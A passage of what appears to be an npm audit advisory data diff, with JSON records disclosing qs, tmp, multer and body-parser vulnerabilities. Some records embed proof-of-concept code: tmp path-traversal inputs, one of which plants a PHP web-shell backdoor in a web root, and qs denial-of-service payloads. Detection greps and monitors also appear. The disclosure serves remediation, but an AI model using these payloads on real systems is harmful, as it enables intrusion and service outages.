},           { arrayFormat: 'comma', encodeValuesOnly: true });\n// TypeError: Cannot read properties of null (reading 'length')\n//     at encode (lib/utils.js:195:13)\n//     at Object.maybeMap (lib/utils.js:322:37)\n//     at stringify (lib/stringify.js:145:25)\n```\n\n#### Fix\n\n`lib/stringify.js:145`, applied in 21f80b3 on `main`:\n\n```diff\n- obj = utils.maybeMap(obj, encoder);\n+ obj = utils.maybeMap(obj, function (v) {\n+     return v == null ? v : encoder(v);\n+ });\n```\n\n`null` and `undefined` now pass through `maybeMap` unchanged and reach the `join(',')` step as-is. For `{ a: [null, 'b'] }` this produces `a=,b`, matching the non-`encodeValuesOnly` comma path (which already joins before encoding and produces `a=%2Cb` for the same input). Single-element `[null]` arrays still collapse via the existing `obj.join(',') || null` and remain subject to `skipNulls` / `strictNullHandling` in the main loop.\n\n### Affected versions\n\n`>=6.11.1 <=6.15.1`\n\nThe vulnerable code shape was introduced in 4c4b23d and first shipped in v6.11.1. Earlier versions ÔÇö including all of 6.7.x, 6.8.x, 6.9.x, 6.10.x, and 6.11.0 ÔÇö implemented the comma + `encodeValuesOnly` path differently (joining before encoding) and are not affected. Empirically verified across released versions.\n\n### Impact\n\nApplication code that calls `qs.stringify` with both `arrayFormat: 'comma'` and `encodeValuesOnly: true` (both non-default) on input that may contain a `null` or `undefined` array element will throw synchronously instead of producing a query string. In a typical Node.js HTTP framework (Express, Fastify, Koa, hapi) the sync throw is caught by the framework's error boundary and the affected request returns a 500; the worker process does not exit and subsequent requests are unaffected. The \"kills the worker process\" framing applies only to call sites outside a request-handler error boundary (background jobs, startup paths, stream pipelines) or to deployments with framework error handling explicitly disabled.\n\nThe vulnerable input is a `null` or `undefined` entry inside an array; this is reachable from JSON request bodies or from application code constructing arrays from user input, but not from standard HTML form submissions (which produce strings or omitted fields, not literal `null`).",
+      "reported_by": null,
+      "title": "qs has a remotely triggerable DoS: qs.stringify crashes with TypeError on null/undefined entries in comma-format arrays when encodeValuesOnly is set",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-8723"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "qs",
+      "vulnerable_versions": ">=6.11.1 <=6.15.1",
+      "github_advisory_id": "GHSA-q8mj-m7cp-5q26",
+      "recommendation": "Upgrade to version 6.15.2 or later",
+      "patched_versions": ">=6.15.2",
+      "updated": "2026-05-22T17:27:20.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-476"
+      ],
+      "url": "https://github.com/advisories/GHSA-q8mj-m7cp-5q26"
+    },
+    "1120654": {
+      "findings": [
+        {
+          "version": "0.0.33",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/raszi/node-tmp/security/advisories/GHSA-ph9p-34f9-6g65\n- https://github.com/raszi/node-tmp/commit/efa4a06f24374797ae32ab2b6ae39b7a611ae429\n- https://nvd.nist.gov/vuln/detail/CVE-2026-44705\n- https://github.com/advisories/GHSA-ph9p-34f9-6g65",
+      "created": "2026-05-27T00:34:06.000Z",
+      "id": 1120654,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nThe tmp npm package contains a path traversal vulnerability that allows escaping the intended temporary directory when untrusted data flows into the `prefix`, `postfix`, or `dir` options. By embedding traversal sequences (e.g., `../`) or path separators in these parameters, attackers can cause files to be created outside the configured temporary base directory at attacker-controlled locations with the privileges of the running process. This vulnerability affects applications that pass user-controlled data to tmp's file/directory creation functions without proper input sanitization.\n\n### Details\n\n**Root Cause:**\nThe vulnerability exists in tmp's path construction logic where user-supplied options are directly concatenated into file paths without sanitization or validation.\n\n**Technical Flow:**\n1. **Filename Construction:** tmp builds filenames as `<prefix>-<pid>-<random>-<postfix>`\n2. **Path Composition:** Final path computed as `path.join(tmpDir, opts.dir, name)`\n3. **Path Normalization:** Node.js `path.join()` normalizes traversal sequences, allowing escape\n4. **File Creation:** File created at the resulting (potentially escaped) path\n\n**Vulnerable Pattern:**\n```javascript\n// In tmp package internals\nconst name = `${opts.prefix || ''}-${process.pid}-${randomString}-${opts.postfix || ''}`;\nconst finalPath = path.join(tmpDir, opts.dir || '', name);\n// No validation that finalPath remains within tmpDir\n```\n\n**Path Traversal Mechanics:**\n- **prefix/postfix traversal:** `../../../evil` in prefix escapes directory structure\n- **Absolute path bypass:** If `opts.dir` is absolute, `path.join()` ignores `tmpDir` completely\n- **Normalization exploitation:** `path.join()` resolves `../` sequences regardless of surrounding text\n- **Cross-platform impact:** Works on Windows (`..\\\\`), Unix (`../`), and mixed path systems\n\n**Key Vulnerability Points:**\n- No input validation on `prefix`, `postfix`, or `dir` parameters\n- Direct use of user input in path construction\n- Reliance on `path.join()` normalization without containment checks\n- Missing post-construction validation that final path remains within intended directory\n\n### PoC\n\n**Basic Path Traversal via prefix:**\n```javascript\nconst tmp = require('tmp');\nconst path = require('path');\nconst fs = require('fs');\n\n// Create a controlled base directory\nconst baseDir = fs.mkdtempSync('/tmp/safe-base-');\nconsole.log('Base directory:', baseDir);\n\n// Escape via prefix\ntmp.file({ \n  tmpdir: baseDir, \n  prefix: '../escaped' \n}, (err, filepath, fd, cleanup) => {\n  if (err) throw err;\n  \n  console.log('Created file:', filepath);\n  console.log('Relative to base:', path.relative(baseDir, filepath));\n  // Output shows: ../escaped-<pid>-<random>\n  \n  cleanup();\n});\n```\n\n**Directory Escape via postfix:**\n```javascript\ntmp.file({ \n  tmpdir: baseDir, \n  postfix: '/../../pwned.txt' \n}, (err, filepath, fd, cleanup) => {\n  if (err) throw err;\n  \n  console.log('Escaped file:', filepath);\n  console.log('Escaped outside base:', !filepath.startsWith(baseDir));\n  \n  cleanup();\n});\n```\n\n**Absolute Path Bypass via dir:**\n```javascript\ntmp.file({ \n  tmpdir: '/safe/tmp/dir', \n  dir: '/tmp/evil-location',\n  prefix: 'bypassed'\n}, (err, filepath, fd, cleanup) => {\n  if (err) throw err;\n  \n  console.log('Bypassed to:', filepath);\n  // File created in /tmp/evil-location instead of /safe/tmp/dir\n  \n  cleanup();\n});\n```\n\n**Advanced Multi-Vector Attack:**\n```javascript\nconst maliciousOpts = {\n  tmpdir: '/app/safe-tmp',\n  dir: '../../../tmp',           // Escape base\n  prefix: '../sensitive-area/',   // Further traversal\n  postfix: 'malicious.config'     // Controlled filename\n};\n\ntmp.file(maliciousOpts, (err, filepath, fd, cleanup) => {\n  // Results in file creation at: /tmp/sensitive-area/malicious.config\n  console.log('Final malicious path:', filepath);\n  cleanup();\n});\n```\n\n**Real-World Attack Simulation:**\n```javascript\n// Simulate web API that accepts user file prefix\nfunction createUserTempFile(userPrefix, content) {\n  return new Promise((resolve, reject) => {\n    tmp.file({ prefix: userPrefix }, (err, path, fd, cleanup) => {\n      if (err) return reject(err);\n      \n      fs.writeSync(fd, content);\n      console.log('User file created at:', path);\n      resolve({ path, cleanup });\n    });\n  });\n}\n\n// Attacker input\nconst attackerPrefix = '../../../var/www/html/backdoor';\ncreateUserTempFile(attackerPrefix, '<?php system($_GET[\"cmd\"]); ?>');\n// Creates PHP backdoor in web root instead of temp directory\n```\n\n### Impact\n\n**Arbitrary File Creation:**\n- Files created outside intended temporary directories\n- Attacker control over file placement location\n- Potential to overwrite existing files (depending on creation flags)\n- Cross-platform exploitation capability\n\n**Attack Scenarios:**\n\n**1. Web Application Configuration Poisoning:**\n- User uploads file with malicious prefix/postfix\n- tmp creates \"temporary\" file in application configuration directory\n- Malicious configuration loaded on next application restart\n\n**2. Cache Poisoning:**\n- Application caches user content using tmp\n- Attacker escapes to cache directory of different user/tenant\n- Poisoned cache serves malicious content to other users\n\n**3. Build Pipeline Compromise:**\n- CI/CD system processes user PRs with tmp usage\n- Malicious prefix escapes to build output directories\n- Compromised build artifacts deployed to production\n\n**4. Container Escape Attempt:**\n- Containerized application uses tmp with user input\n- Attacker attempts to escape container temp restrictions\n- Files created in host-mapped volumes or sensitive container areas\n\n**5. Multi-Tenant Service Bypass:**\n- SaaS platform isolates tenants using separate tmp directories\n- Tenant A escapes their tmp space to tenant B's area\n- Cross-tenant data access and potential privilege escalation\n\n**Business Impact:**\n- **Data Integrity:** Unauthorized file placement can corrupt application state\n- **Service Disruption:** Files in wrong locations may break application functionality  \n- **Security Bypass:** Escape temporary isolation boundaries\n- **Compliance Violations:** Files containing sensitive data placed in uncontrolled locations\n\n### Affected Products\n\n- **Ecosystem:** npm\n- **Package name:** tmp\n- **Repository:** github.com/raszi/node-tmp\n- **Affected versions:** All versions with vulnerable path construction logic\n- **Patched versions:** None currently available\n\n**Component Impact:**\n- `tmp.file()` function - vulnerable to prefix/postfix/dir traversal\n- `tmp.dir()` function - vulnerable to same parameter manipulation  \n- `tmp.tmpName()` function - if using affected path construction\n\n**Severity:** High  \n**CVSS v3.1:** 8.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:L)\n\n**CWE Classification:**\n- CWE-22: Improper Limitation of a Pathname to a Restricted Directory (Path Traversal)\n\n### Remediation\n\n**Input Validation and Sanitization:**\n\n1. **Sanitize prefix/postfix:**\n```javascript\nfunction sanitizePrefix(prefix) {\n  if (!prefix) return '';\n  // Remove path separators and traversal sequences\n  return path.basename(String(prefix)).replace(/[\\.\\/\\\\]/g, '-');\n}\n\nfunction sanitizePostfix(postfix) {\n  if (!postfix) return '';\n  // Allow only safe characters\n  return String(postfix).replace(/[^A-Za-z0-9._-]/g, '');\n}\n```\n\n2. **Validate dir parameter:**\n```javascript\nfunction validateDir(dir, baseDir) {\n  if (!dir) return '';\n  \n  // Reject absolute paths\n  if (path.isAbsolute(dir)) {\n    throw new Error('Absolute paths not allowed for dir option');\n  }\n  \n  // Resolve and check containment\n  const resolved = path.resolve(baseDir, dir);\n  const relative = path.relative(baseDir, resolved);\n  \n  if (relative.startsWith('..') || path.isAbsolute(relative)) {\n    throw new Error('Dir option escapes base directory');\n  }\n  \n  return dir;\n}\n```\n\n3. **Post-construction path validation:**\n```javascript\nfunction validateFinalPath(finalPath, baseDir) {\n  const resolved = path.resolve(finalPath);\n  const relative = path.relative(path.resolve(baseDir), resolved);\n  \n  if (relative.startsWith('..') || path.isAbsolute(relative)) {\n    throw new Error('Generated path escapes temporary directory');\n  }\n  \n  return resolved;\n}\n```\n\n**Secure Implementation Pattern:**\n```javascript\nfunction createTempFile(options) {\n  const opts = { ...options };\n  \n  // Sanitize inputs\n  opts.prefix = sanitizePrefix(opts.prefix);\n  opts.postfix = sanitizePostfix(opts.postfix);\n  opts.dir = validateDir(opts.dir, opts.tmpdir);\n  \n  // Create with sanitized options\n  return tmp.file(opts, (err, path, fd, cleanup) => {\n    if (err) return callback(err);\n    \n    // Validate final path\n    try {\n      validateFinalPath(path, opts.tmpdir);\n    } catch (validationErr) {\n      cleanup();\n      return callback(validationErr);\n    }\n    \n    callback(null, path, fd, cleanup);\n  });\n}\n```\n\n### Workarounds\n\n**For Application Developers:**\n\n1. **Input Sanitization:**\n```javascript\n// Sanitize before passing to tmp\nfunction safeTmpFile(userOptions) {\n  const safeOpts = {\n    ...userOptions,\n    prefix: userOptions.prefix ? path.basename(userOptions.prefix) : undefined,\n    postfix: userOptions.postfix ? userOptions.postfix.replace(/[^A-Za-z0-9._-]/g, '') : undefined,\n    dir: undefined // Don't allow user-controlled dir\n  };\n  \n  return tmp.file(safeOpts);\n}\n```\n\n2. **Path Validation:**\n```javascript\nfunction validateTmpPath(tmpPath, expectedBase) {\n  const relativePath = path.relative(expectedBase, tmpPath);\n  if (relativePath.startsWith('..') || path.isAbsolute(relativePath)) {\n    throw new Error('Temporary file path escaped base directory');\n  }\n  return tmpPath;\n}\n```\n\n3. **Restricted Usage:**\n```javascript\n// Only use tmp with known-safe, literal values\ntmp.file({ prefix: 'app-temp-', postfix: '.tmp' }, callback);\n// Never: tmp.file({ prefix: userInput }, callback);\n```\n\n**For Security Teams:**\n\n1. **Code Review Patterns:**\n```bash\n# Search for dangerous tmp usage\ngrep -r \"tmp\\.file.*prefix.*req\\|tmp\\.file.*postfix.*req\" .\ngrep -r \"tmp\\.dir.*opts\\|tmp\\.file.*opts\" .\n```\n\n2. **Runtime Monitoring:**\n```javascript\n// Monitor for files created outside expected temp areas\nconst originalFile = tmp.file;\ntmp.file = function(options, callback) {\n  return originalFile(options, (err, path, fd, cleanup) => {\n    if (!err && options.tmpdir) {\n      const relative = require('path').relative(options.tmpdir, path);\n      if (relative.startsWith('..')) {\n        console.warn('Path traversal detected:', path);\n      }\n    }\n    return callback(err, path, fd, cleanup);\n  });\n};\n```\n\n### Detection and Monitoring\n\n**Static Analysis:**\n- Scan for tmp usage with user-controlled input\n- Identify unsanitized parameter passing to tmp functions\n- Review file creation patterns in temporary directories\n\n**Runtime Detection:**\n```javascript\n// Log suspicious tmp operations\nfunction monitorTmpUsage() {\n  const originalTmpFile = require('tmp').file;\n  \n  require('tmp').file = function(options = {}, callback) {\n    // Check for suspicious patterns\n    const suspicious = [\n      options.prefix && options.prefix.includes('..'),\n      options.postfix && options.postfix.includes('..'),  \n      options.dir && path.isAbsolute(options.dir)\n    ].some(Boolean);\n    \n    if (suspicious) {\n      console.warn('Suspicious tmp usage detected:', options);\n    }\n    \n    return originalTmpFile.call(this, options, callback);\n  };\n}\n```\n\n**File System Monitoring:**\n```bash\n# Monitor file creation outside expected temp directories\ninotifywait -m -r --format '%w%f %e' /tmp /var/tmp | while read file event; do\n  if [[ \"$event\" == *\"CREATE\"* && \"$file\" != /tmp/tmp-* ]]; then\n    echo \"Unexpected file creation: $file\"\n  fi\ndone\n```\n### Acknowledgements\n\n**Reported by**: Mapta / BugBunny_ai",
+      "reported_by": null,
+      "title": "tmp has Path Traversal via unsanitized prefix/postfix that enables directory escape",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-44705"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "tmp",
+      "vulnerable_versions": "<0.2.6",
+      "github_advisory_id": "GHSA-ph9p-34f9-6g65",
+      "recommendation": "Upgrade to version 0.2.6 or later",
+      "patched_versions": ">=0.2.6",
+      "updated": "2026-06-12T19:25:33.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-22"
+      ],
+      "url": "https://github.com/advisories/GHSA-ph9p-34f9-6g65"
+    },
+    "1121089": {
+      "findings": [
+        {
+          "version": "2.0.2",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/expressjs/multer/security/advisories/GHSA-72gw-mp4g-v24j\n- https://nvd.nist.gov/vuln/detail/CVE-2026-5079\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/advisories/GHSA-72gw-mp4g-v24j",
+      "created": "2026-06-17T18:12:27.000Z",
+      "id": 1121089,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nMulter is vulnerable to a Denial of Service (DoS) via deeply nested field names in multipart form data. The `append-field` dependency parses bracket notation in field names (e.g., `a[b][c]`) with no limit on nesting depth, allowing an attacker to force allocation of deeply nested object structures that consume CPU and memory. A single HTTP request with a crafted multipart body is sufficient to exploit this.\n\n### Patches\n\nUsers should upgrade to `2.2.0` and configure `limits.fieldNestingDepth` to the minimum depth their application requires.\n\n### Workarounds\n\nSet `limits.fields` to a reasonable value to reduce the number of fields an attacker can send per request. This does not fully mitigate the issue but limits the impact.",
+      "reported_by": null,
+      "title": "Multer vulnerable to Denial of Service via deeply nested field names",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-5079"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "multer",
+      "vulnerable_versions": ">=1.0.0 <2.2.0",
+      "github_advisory_id": "GHSA-72gw-mp4g-v24j",
+      "recommendation": "Upgrade to version 2.2.0 or later",
+      "patched_versions": ">=2.2.0",
+      "updated": "2026-06-17T18:12:28.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-400"
+      ],
+      "url": "https://github.com/advisories/GHSA-72gw-mp4g-v24j"
+    },
+    "1121091": {
+      "findings": [
+        {
+          "version": "2.0.2",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/expressjs/multer/security/advisories/GHSA-3p4h-7m6x-2hcm\n- https://nvd.nist.gov/vuln/detail/CVE-2026-5038\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/advisories/GHSA-3p4h-7m6x-2hcm",
+      "created": "2026-06-17T18:11:48.000Z",
+      "id": 1121091,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nA vulnerability in Multer allows an attacker to trigger a Denial of Service (DoS) by aborting or sending malformed multipart uploads, causing orphaned partial files to accumulate on disk when using diskStorage.\n\n### Patches\n\nUsers should upgrade to `2.2.0`, `3.0.0-alpha.2` or higher\n\n### Workarounds\n\nNone",
+      "reported_by": null,
+      "title": "Multer vulnerable to Denial of Service via incomplete cleanup of aborted uploads",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-5038"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "multer",
+      "vulnerable_versions": ">=2.0.0-alpha.1 <2.2.0",
+      "github_advisory_id": "GHSA-3p4h-7m6x-2hcm",
+      "recommendation": "Upgrade to version 2.2.0 or later",
+      "patched_versions": ">=2.2.0",
+      "updated": "2026-06-17T18:11:50.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-459"
+      ],
+      "url": "https://github.com/advisories/GHSA-3p4h-7m6x-2hcm"
+    },
+    "1123977": {
+      "findings": [
+        {
+          "version": "1.20.4",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/expressjs/body-parser/security/advisories/GHSA-v422-hmwv-36x6\n- https://nvd.nist.gov/vuln/detail/CVE-2026-12590\n- https://github.com/expressjs/body-parser/pull/698\n- https://github.com/expressjs/body-parser/pull/741\n- https://github.com/expressjs/body-parser/commit/2322e111cc321413ec2b7b76d01be533d3de9d7d\n- https://github.com/expressjs/body-parser/commit/3492672eee593d5c158f239b6e9115498a5dbeac\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/expressjs/body-parser/releases/tag/1.20.6\n- https://github.com/expressjs/body-parser/releases/tag/v2.3.0\n- https://github.com/advisories/GHSA-v422-hmwv-36x6",
+      "created": "2026-07-20T23:23:26.000Z",
+      "id": 1123977,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nWhen body-parser is configured with an invalid `limit` option value, such as an unparseable string or `NaN`, `bytes.parse()` returns `null` and the request body size check is silently skipped. Applications that rely on `limit` as their primary safeguard against oversized request bodies will accept arbitrarily large payloads, leading to excessive memory and CPU usage and denial of service.\n\nThis issue affects applications that pass a programmatically computed or user-configurable value to the `limit` option without validating it first.\n\n### Patches\n\nThis issue is fixed in [body-parser@2.3.0](https://github.com/expressjs/body-parser/releases/tag/v2.3.0) and [body-parser@1.20.6](https://github.com/expressjs/body-parser/releases/tag/v1.20.6) via [#698](https://github.com/expressjs/body-parser/pull/698). After the fix, invalid `limit` values throw a clear error at parser construction time instead of silently disabling enforcement. `null` and `undefined` continue to fall back to the default limit (`100kb`).\n\n### Workarounds\n\nValidate `limit` before passing it to body-parser. For example, parse the value with [`bytes.parse()`](https://github.com/visionmedia/bytes.js) at startup and reject any configuration where it returns `null` or a non-finite number.\n\n### References\n\n- [#698](https://github.com/expressjs/body-parser/pull/698): fix PR\n- [bytes.js](https://github.com/visionmedia/bytes.js): limit parser",
+      "reported_by": null,
+      "title": "body-parser vulnerable to denial of service when invalid limit value silently disables size enforcement",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-12590"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "body-parser",
+      "vulnerable_versions": "<1.20.6",
+      "github_advisory_id": "GHSA-v422-hmwv-36x6",
+      "recommendation": "Upgrade to version 1.20.6 or later",
+      "patched_versions": ">=1.20.6",
+      "updated": "2026-07-20T23:23:28.000Z",
+      "cvss": {
+        "score": 3.7,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-770"
+      ],
+      "url": "https://github.com/advisories/GHSA-v422-hmwv-36x6"
+    },
+    "1158506": {
+      "findings": [
+        {
+          "version": "6.14.2",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/ljharb/qs/security/advisories/GHSA-w7fw-mjwx-w883\n- https://github.com/ljharb/qs/security/advisories/GHSA-x5fp-wj9c-mxmx\n- https://nvd.nist.gov/vuln/detail/CVE-2026-82562\n- https://github.com/ljharb/qs/commit/8859c37470e11b42b547b275e4e9bd0bc8cc5464\n- https://github.com/advisories/GHSA-x5fp-wj9c-mxmx",
+      "created": "2026-09-02T14:46:57.000Z",
+      "id": 1158506,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n`qs` `v6.15.3` allows bracket-key input to bypass `arrayLimit` and `throwOnLimitExceeded` when `comma: true`. The input `a[]=1,2,3,4` succeeds with `arrayLimit: 3`, while the equivalent plain-key input is rejected.\n\nAffected version tested:\n\n```text\nqs v6.15.3\ncommit 18d085e919dae70c8f1b200ab99323058edab2c2\n```\n\n### Details\n\n`parseArrayValue()` enforces the comma limit only for flat values. The `a[]` form is marked non-flat, so its comma-separated value is wrapped after parsing and the inner array is not checked. A single parameter can therefore materialize arbitrarily large arrays.\n\n### PoC\n\n```js\nconst qs = require('qs')\nconst options = { comma: true, arrayLimit: 3, throwOnLimitExceeded: true }\n\nconst result = qs.parse('a[]=1,2,3,4', options)\nconsole.log(result.a[0].length) // 4; expected RangeError\n\nconst big = qs.parse('a[]=' + '1,'.repeat(1000000) + '1', { comma: true, arrayLimit: 20 })\nconsole.log(big.a[0].length) // 1000001\n```\n\nOn `v6.15.3`, the first input parses successfully and the second creates an array with 1,000,001 elements. The equivalent `a=1,2,3,4` input throws `RangeError` as expected.\n\n### Impact\n\nAn attacker who can supply a query string or form body can bypass configured array limits and force excessive memory allocation, causing denial of service. The limit must be applied after comma splitting and before the resulting array is wrapped.",
+      "reported_by": null,
+      "title": "qs array-limit bypass via bracket-key comma parsing",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-82562"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "qs",
+      "vulnerable_versions": ">=6.14.2 <=6.15.3",
+      "github_advisory_id": "GHSA-x5fp-wj9c-mxmx",
+      "recommendation": "Upgrade to version 6.16.0 or later",
+      "patched_versions": ">=6.16.0",
+      "updated": "2026-09-02T14:46:58.000Z",
+      "cvss": {
+        "score": 3.7,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-770"
+      ],
+      "url": "https://github.com/advisories/GHSA-x5fp-wj9c-mxmx"
+    },
+    "1158507": {
+      "findings": [
+        {
+          "version": "6.14.2",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/ljharb/qs/security/advisories/GHSA-4mjr-xmp4-gh2g\n- https://nvd.nist.gov/vuln/detail/CVE-2026-82417\n- https://github.com/ljharb/qs/commit/e83d321ffafb38cf210683ac31714fce6ce1c6c6\n- https://github.com/advisories/GHSA-4mjr-xmp4-gh2g",
+      "created": "2026-09-02T14:45:13.000Z",
+      "id": 1158507,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n`qs.stringify()` calls `utils.isBuffer()` on every value it serializes, and `utils.isBuffer()` invokes `obj.constructor.isBuffer(obj)` without checking that it is callable. A value whose own `constructor.isBuffer` is a non-function makes `qs` call a non-callable and throw `TypeError`. Such a value is produced **by `qs.parse` itself** from an untrusted query string when `plainObjects: true` or `allowPrototypes: true` is set, so a pure-`qs` `parse` ÔåÆ `stringify` round-trip ÔÇö no `JSON.parse` ÔÇö turns an unauthenticated query string into an uncaught throw.\n\nAn attacker-controlled `parse` input reaches the host application's availability asset ÔÇö via `qs`'s own recommended `plainObjects` mitigation ÔÇö and triggers an uncaught exception during a `parse` ÔåÆ `stringify` round-trip.\n\n### Details\n`utils.isBuffer` runs at `lib/stringify.js:127` for every serialized value:\n\n```js\nif (isNonNullishPrimitive(obj) || utils.isBuffer(obj)) { ... }\n```\n\n`utils.isBuffer` (`lib/utils.js:327-333`) invokes `obj.constructor.isBuffer` without verifying it is callable:\n\n```js\nvar isBuffer = function isBuffer(obj) {\n    if (!obj || typeof obj !== 'object') { return false; }\n    return !!(obj.constructor && obj.constructor.isBuffer && obj.constructor.isBuffer(obj));\n};\n```\n\n`constructor` and `isBuffer` are ordinary keys. `qs.parse` with `plainObjects: true` or `allowPrototypes: true` keeps them as own properties, so the parsed value carries a non-function `constructor.isBuffer`; `stringify` then calls a non-callable and throws `TypeError`. By contrast `utils.isRegExp` uses a brand check (`Object.prototype.toString`); the missing guard here is an internal inconsistency, not a platform limitation.\n\n\n### Trust Boundary Note\n\n`qs.stringify` alone treats its input as caller-constructed, so serializing a hostile object could be argued outside its contract. This report does not depend on that framing: the malicious shape is produced by **`qs.parse`, whose input is untrusted by design**. `qs.parse` normally strips a `constructor` key via its prototype guard, but with the documented options `plainObjects: true` or `allowPrototypes: true` the key survives and lands as an own property. Feeding the parsed object back into `qs.stringify` ÔÇö the standard round-trip in gateways and request-forwarders ÔÇö then hits the unchecked call. \n\n\n### PoC\n`poc02c_isBuffer_qs_only_roundtrip.js` ÔÇö pure-`qs` chain, no `JSON.parse`; an untrusted query string alone reaches the throw:\n\n```js\n'use strict';\nvar qs = require('qs');\n\nvar untrustedQueryString = 'x%5Bconstructor%5D%5BisBuffer%5D=y'; // x[constructor][isBuffer]=y\n\nvar parsed = qs.parse(untrustedQueryString, { plainObjects: true });\nconsole.log('[parse] kept constructor key:', JSON.stringify(parsed));\n\ntry {\n    qs.stringify(parsed);\n    console.log('[stringify] no throw (unexpected)');\n} catch (e) {\n    console.log('[stringify] DoS reproduced ->', e.constructor.name + ':', e.message);\n}\n```\n\n`poc02_isBuffer.js` ÔÇö the minimal defect:\n\n```js\n'use strict';\nvar qs = require('qs');\ntry {\n    qs.stringify(JSON.parse('{\"a\":{\"constructor\":{\"isBuffer\":\"x\"}}}'));\n} catch (e) {\n    console.log('[A] DoS reproduced ->', e.constructor.name + ':', e.message);\n}\n```\n\n`poc02b_isBuffer_async_crash.js` ÔÇö worker death in an async sink:\n\n```js\n'use strict';\nvar qs = require('qs');\n\nfunction handleRequestAsync(clientJsonBody) {\n    try {\n        setImmediate(function () {                 // async continuation, outside the try\n            qs.stringify(JSON.parse(clientJsonBody)); // throws here, uncaught\n        });\n        console.log('[handler] returned 200 synchronously; async work scheduled');\n    } catch (e) {\n        console.log('[handler] caught synchronously (will NOT happen):', e.message);\n    }\n}\nprocess.on('exit', function (code) {\n    console.log('[proc] process exiting with code:', code);\n});\nhandleRequestAsync('{\"filters\":{\"constructor\":{\"isBuffer\":\"x\"}}}');\n```\n\n### Execution Steps\n\n```bash\ncd poc\nnpm install qs@6.15.3\nnode poc02c_isBuffer_qs_only_roundtrip.js  # pure qs parse->stringify -> TypeError\nnode poc02_isBuffer.js                      # minimal defect -> TypeError inside stringify\nnode poc02b_isBuffer_async_crash.js         # async sink -> uncaught throw -> exit code 1\n```\n\n### Reproduction Evidence\n\n`poc02c_isBuffer_qs_only_roundtrip.js` :\n\n```\n[parse] kept constructor key: {\"x\":{\"constructor\":{\"isBuffer\":\"y\"}}}\n[stringify] DoS reproduced -> TypeError: obj.constructor.isBuffer is not a function\n```\n\n`poc02_isBuffer.js`:\n\n```\n[A] DoS reproduced -> TypeError: obj.constructor.isBuffer is not a function\n```\n\n`poc02b_isBuffer_async_crash.js` :\n\n```\n[handler] returned 200 synchronously; async work scheduled\n[proc] process exiting with code: 1\nTypeError: obj.constructor.isBuffer is not a function\n    at Object.isBuffer (.../qs/lib/utils.js:332:78)\n    at stringify (.../qs/lib/stringify.js:127:45)\n=== EXIT CODE: 1 ===\n```\n\nThe pure-`qs` round-trip shows the malicious shape originates from `qs.parse` of an untrusted query string, with no `JSON.parse`. The synchronous `try/catch` in the async case does not catch the throw; the process exits with code 1, denying service to all requests on that worker.\n\n### Impact\n\nAn unauthenticated request degrades any endpoint that re-serializes deserialized client data with `qs.stringify`. The primary impact is a per-request failure: the handler throws and the framework returns HTTP 500. Where the call sits in an unguarded async continuation, the throw escapes and the worker process exits, denying service to all requests it was handling, which means a higher impact that depends on the application's error handling, not on `qs`.\n\n### Recommended Fix\n\nReplace the duck-type with a brand check mirroring `utils.isRegExp`:\n\n```js\nvar isBuffer = function isBuffer(obj) {\n    if (!obj || typeof obj !== 'object') { return false; }\n    if (typeof Buffer !== 'undefined' && typeof Buffer.isBuffer === 'function') {\n        return Buffer.isBuffer(obj);\n    }\n    return Object.prototype.toString.call(obj) === '[object Uint8Array]';\n};\n```\n\nIf duck-typing must remain, require `typeof obj.constructor.isBuffer === 'function'` before invoking and wrap the call in `try/catch`.",
+      "reported_by": null,
+      "title": "qs: Denial of Service via Attacker Controlled isBuffer",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-82417"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "qs",
+      "vulnerable_versions": ">=2.2.5 <6.16.0",
+      "github_advisory_id": "GHSA-4mjr-xmp4-gh2g",
+      "recommendation": "Upgrade to version 6.16.0 or later",
+      "patched_versions": ">=6.16.0",
